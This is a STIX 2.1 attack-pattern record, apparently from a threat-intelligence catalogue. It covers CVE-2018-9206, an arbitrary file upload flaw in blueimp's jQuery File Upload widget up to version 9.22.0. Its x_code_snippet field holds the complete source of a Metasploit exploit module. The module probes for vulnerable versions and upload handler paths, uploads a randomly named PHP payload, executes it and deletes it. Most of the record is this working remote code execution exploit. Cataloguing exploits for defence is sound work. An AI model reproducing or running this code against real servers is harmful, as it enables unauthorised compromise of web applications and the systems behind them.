{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2d29ab8e-8fe4-4914-b137-89127c314c3e",
    "created": "2024-08-14T17:13:31.439398Z",
    "modified": "2024-08-14T17:13:31.439402Z",
    "name": "\"blueimps jQuery (Arbitrary) File Upload\"",
    "description": " This module exploits an arbitrary file upload in the sample PHP upload handler for blueimp's jQuery File Upload widget in versions <= 9.22.0.  Due to a default configuration in Apache 2.3.9+, the widget's .htaccess file may be disabled, enabling exploitation of this vulnerability.  This vulnerability has been exploited in the wild since at least 2015 and was publicly disclosed to the vendor in 2018. It has been present since the .htaccess change in Apache 2.3.9.  This module provides a generic exploit against the jQuery widget. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/jquery_file_upload.rb",
            "external_id": "jquery_file_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-9206"
        },
        {
            "source_name": "reference",
            "url": "http://www.vapidlabs.com/advisory.php?v=204"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/blueimp/jQuery-File-Upload/pull/3514"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/lcashdol/Exploits/tree/master/CVE-2018-9206"
        },
        {
            "source_name": "reference",
            "url": "https://www.homelab.it/index.php/2015/04/04/wordpress-work-the-flow-file-upload-vulnerability/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/rapid7/metasploit-framework/pull/5130"
        },
        {
            "source_name": "reference",
            "url": "https://httpd.apache.org/docs/current/mod/core.html#allowoverride"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::PhpEXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => \"blueimp's jQuery (Arbitrary) File Upload\",\n      'Description'    => %q{\n        This module exploits an arbitrary file upload in the sample PHP upload\n        handler for blueimp's jQuery File Upload widget in versions <= 9.22.0.\n\n        Due to a default configuration in Apache 2.3.9+, the widget's .htaccess\n        file may be disabled, enabling exploitation of this vulnerability.\n\n        This vulnerability has been exploited in the wild since at least 2015\n        and was publicly disclosed to the vendor in 2018. It has been present\n        since the .htaccess change in Apache 2.3.9.\n\n        This module provides a generic exploit against the jQuery widget.\n      },\n      'Author'         => [\n        'Claudio Viviani',     # WordPress Work the Flow (Arbitrary) File Upload\n        'Larry W. Cashdollar', # (Re)discovery, vendor disclosure, and PoC\n        'wvu'                  # Metasploit module\n      ],\n      'References'     => [\n        ['CVE', '2018-9206'],\n        ['URL', 'http://www.vapidlabs.com/advisory.php?v=204'],\n        ['URL', 'https://github.com/blueimp/jQuery-File-Upload/pull/3514'],\n        ['URL', 'https://github.com/lcashdol/Exploits/tree/master/CVE-2018-9206'],\n        ['URL', 'https://www.homelab.it/index.php/2015/04/04/wordpress-work-the-flow-file-upload-vulnerability/'],\n        ['URL', 'https://github.com/rapid7/metasploit-framework/pull/5130'],\n        ['URL', 'https://httpd.apache.org/docs/current/mod/core.html#allowoverride']\n      ],\n      'DisclosureDate' => '2018-10-09', # Larry's disclosure to the vendor\n      'License'        => MSF_LICENSE,\n      'Platform'       => ['php', 'linux'],\n      'Arch'           => [ARCH_PHP, ARCH_X86, ARCH_X64],\n      'Privileged'     => false,\n      'Targets'        => [\n        ['PHP Dropper',   'Platform' => 'php',   'Arch' => ARCH_PHP],\n        ['Linux Dropper', 'Platform' => 'linux', 'Arch' => [ARCH_X86, ARCH_X64]]\n      ],\n      'DefaultTarget'  => 0\n    ))\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/jQuery-File-Upload'])\n    ])\n  end\n\n  def version_paths\n    %w[\n      /package.json\n      /bower.json\n    ].map { |u| normalize_uri(target_uri.path, u) }\n  end\n\n  # List from PoC sorted by frequency\n  def upload_paths\n    %w[\n      /server/php/index.php\n      /server/php/upload.class.php\n      /server/php/UploadHandler.php\n      /example/upload.php\n      /php/index.php\n    ].map { |u| normalize_uri(target_uri.path, u) }\n  end\n\n  def check\n    a = nil\n\n    version_paths.each do |u|\n      vprint_status(\"Checking #{u}\")\n\n      res = send_request_cgi(\n        'method' => 'GET',\n        'uri'    => u\n      )\n\n      next unless res\n\n      unless a\n        res.headers['Server'] =~ /Apache\\/([\\d.]+)/ &&\n          $1 && (a = Rex::Version.new($1))\n\n        if a && a >= Rex::Version.new('2.3.9')\n          vprint_good(\"Found Apache #{a} (AllowOverride None may be set)\")\n        elsif a\n          vprint_warning(\"Found Apache #{a} (AllowOverride All may be set)\")\n        end\n      end\n\n      next unless res.code == 200 && (j = res.get_json_document) &&\n                  j['version'] && (v = Rex::Version.new(j['version']))\n\n      if v <= Rex::Version.new('9.22.0')\n        vprint_good(\"Found unpatched jQuery File Upload #{v}\")\n        return CheckCode::Appears\n      else\n        vprint_error(\"Found patched jQuery File Upload #{v}\")\n        return CheckCode::Safe\n      end\n    end\n\n    CheckCode::Unknown\n  end\n\n  def find_upload\n    upload_paths.each do |u|\n      vprint_status(\"Checking #{u}\")\n\n      res = send_request_cgi(\n        'method' => 'GET',\n        'uri'    => u\n      )\n\n      if res && res.code == 200\n        vprint_good(\"Found #{u}\")\n        return u\n      end\n    end\n\n    nil\n  end\n\n  def exploit\n    unless check == CheckCode::Appears && (u = find_upload)\n      fail_with(Failure::NotFound, 'Could not find target')\n    end\n\n    f = \"#{rand_text_alphanumeric(8..42)}.php\"\n    p = normalize_uri(File.dirname(u), 'files', f)\n\n    print_status('Uploading payload')\n    res = upload_payload(u, f)\n\n    unless res && res.code == 200 && res.body.include?(f)\n      fail_with(Failure::NotVulnerable, 'Could not upload payload')\n    end\n\n    print_good(\"Payload uploaded: #{full_uri(p)}\")\n\n    print_status('Executing payload')\n    exec_payload(p)\n\n    print_status('Deleting payload')\n    delete_payload(u, f)\n  end\n\n  def upload_payload(u, f)\n    p = get_write_exec_payload(unlink_self: true)\n\n    m = Rex::MIME::Message.new\n    m.add_part(p, nil, nil, %(form-data; name=\"files[]\"; filename=\"#{f}\"))\n\n    send_request_cgi(\n      'method' => 'POST',\n      'uri'    => u,\n      'ctype'  => \"multipart/form-data; boundary=#{m.bound}\",\n      'data'   => m.to_s\n    )\n  end\n\n  def exec_payload(p)\n    send_request_cgi({\n      'method' => 'GET',\n      'uri'    => p\n    }, 0)\n  end\n\n  def delete_payload(u, f)\n    send_request_cgi(\n      'method'   => 'DELETE',\n      'uri'      => u,\n      'vars_get' => {'file' => f}\n    )\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2018-10-09, # Larrys disclosure to the vendor",
    "x_mitre_platforms": [
        "['php', 'linux']"
    ]
}